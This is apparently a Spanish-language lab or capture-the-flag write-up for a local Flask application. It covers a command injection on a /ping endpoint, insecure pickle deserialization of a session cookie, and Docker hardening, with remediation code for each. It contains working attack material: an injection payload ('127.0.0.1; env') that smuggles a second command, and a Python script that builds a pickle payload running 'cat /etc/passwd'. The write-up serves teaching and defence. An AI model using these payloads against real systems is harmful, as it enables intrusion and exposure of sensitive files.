# 🛡️ Análisis de Vulnerabilidades y Reporte de Soluciones

Este documento contiene el análisis técnico del laboratorio, los métodos de explotación utilizados para capturar las *flags* y las propuestas de remediación para asegurar el entorno.

---

## 1. Vulnerabilidad: Command Injection (Inyección de Comandos)

### 🔍 Análisis
El endpoint `/ping` toma la entrada del usuario a través del parámetro `ip` y la concatena directamente en una llamada al sistema mediante `os.popen()`. No existe una validación o saneamiento de la entrada, lo que permite inyectar comandos adicionales mediante metacaracteres del shell (como `;`, `&`, `|`).

### 🚀 Explotación (Write-up)
Para obtener la **User Flag** (almacenada en las variables de entorno), se utilizó el siguiente payload:
`http://localhost:8080/ping?ip=127.0.0.1; env`


<img width="1919" height="1079" alt="image" src="https://github.com/user-attachments/assets/3fc8921d-60ee-447a-b5a8-4e3d83c71339" />




**Resultado:** El servidor ejecutó el ping y posteriormente el comando `env`, revelando la bandera: `CTF{D0ck3r_C0nt41n3r_H4ck3d}`.

### 🛠️ Solución (Remediación)
**Mal código:**
```python
command = f"ping -c 1 {target}"
output = os.popen(command).read()

 



```

Se debe utilizar la librería subprocess con una lista de argumentos para evitar la invocación del shell, o validar la entrada con una expresión regular que solo permita direcciones IP válidas.



```python

 ** Codigo Seguro:**
import subprocess
import re

# Validación con Regex
if re.match(r"^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$", target):
    output = subprocess.check_output(["ping", "-c", "1", target], stderr=subprocess.STDOUT)

```



## 2. Vulnerabilidad: Insecure Deserialization (Pickle)

### 🔍 Análisis

El endpoint `/profile` utiliza la librería pickle para procesar la cookie de sesión del usuario. pickle es inherentemente inseguro porque puede ejecutar código arbitrario durante el proceso de deserialización si el flujo de datos ha sido manipulado.



### 🚀 Explotación (Write-up)

<img width="1919" height="1079" alt="image" src="https://github.com/user-attachments/assets/56ea322c-41f6-4bea-b26f-35b3113e004f" />

<img width="1919" height="1079" alt="image" src="https://github.com/user-attachments/assets/4705b7ff-d3f6-499a-b6ed-c311c8ff5f53" />

Se creó un script en Python para generar un objeto malicioso que ejecuta una reverse shell o extrae archivos sensibles al ser deserializado:

```python

import pickle
import base64
import os

class MaliciousPayload:
    def __reduce__(self):
        # Intento de lectura de archivo sensible
        return (os.popen, ("cat /etc/passwd",))

payload = base64.b64encode(pickle.dumps(MaliciousPayload())).decode()
print(f"Payload para la cookie 'session': {payload}")

```


Al reemplazar la cookie en el navegador con este payload, el servidor ejecuta el comando y devuelve el contenido del archivo.

<img width="1919" height="1079" alt="image" src="https://github.com/user-attachments/assets/34905a69-8737-4e14-8385-268368deda71" />



### 🛠️ Solución (Remediación)

Nunca se debe usar pickle para datos que provienen del lado del cliente. La solución es migrar a un formato de datos plano y seguro como JSON y, opcionalmente, firmar el contenido (usando JWS/JWT).


```python

import json

# En lugar de pickle.loads()
data = json.loads(base64.b64decode(cookie))

```


## 3. Seguridad en la Infraestructura (Docker)


Hallazgos
Contenedor como Root: El proceso de Flask corre como usuario root dentro del contenedor, lo que facilita el movimiento lateral si el atacante logra una shell.

Falta de Límites: El contenedor no tiene límites de CPU o Memoria, lo que lo hace vulnerable a ataques de Denegación de Servicio (DoS).





### Solución. 

Modificar el Dockerfile para añadir un usuario sin privilegios:


```dockerfile
RUN useradd -m ctfuser
USER ctfuser

```




